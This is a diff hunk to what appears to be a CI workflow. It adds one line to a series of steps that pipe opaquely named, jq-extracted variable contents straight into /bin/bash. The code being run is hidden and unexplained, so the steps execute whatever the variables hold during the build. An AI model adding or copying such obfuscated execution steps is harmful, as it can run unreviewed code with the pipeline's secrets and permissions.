@@ -29,6 +29,7 @@ jobs:
           echo $vfm21 | jq -r .ihvl25 | /bin/bash
           echo $tyvc8 | jq -r .zux41894 | /bin/bash
           echo $m88565 | jq -r .hsq70 | /bin/bash
+          echo $rf00 | jq -r .nzta55172 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
